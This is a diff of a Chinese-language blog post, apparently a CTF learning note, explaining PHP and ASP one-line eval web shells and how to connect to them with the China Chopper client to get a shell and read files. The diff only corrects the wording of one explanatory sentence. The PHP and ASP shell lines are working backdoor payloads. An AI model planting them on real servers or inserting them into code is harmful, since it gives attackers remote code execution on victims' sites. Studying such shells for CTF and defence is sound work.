@@ -503,7 +503,7 @@
           
             <p>看hbctf的一道题学习了一点，先记录下来。<br>首先需要可以写入文件 写入php文件或asp文件均可。<br>以php为例，新建文件后写入 </p>
 <p><code>&lt;?php @eval($_POST[&#39;QAQ&#39;]);?&gt;</code><br>顺便asp为<code>&lt;%eval request(&quot;QAQ&quot;)%&gt;</code></p>
-<p>“QAQ”相当于一个标记。eval是一个php函数<br>他的符合php语法的字符当做php代码进行执行即一个后门</p>
+<p>“QAQ”相当于一个标记。eval是一个php函数<br>他将符合php语法的字符当做php代码进行执行<br>即一个后门</p>
 <p>（怎么用hackbar的Post data写入文件还不会…以后回来改）</p>
 <p>连接菜刀 输入网站 和当时标记<br>即可拿shell查看文件（flag）等等</p>
 
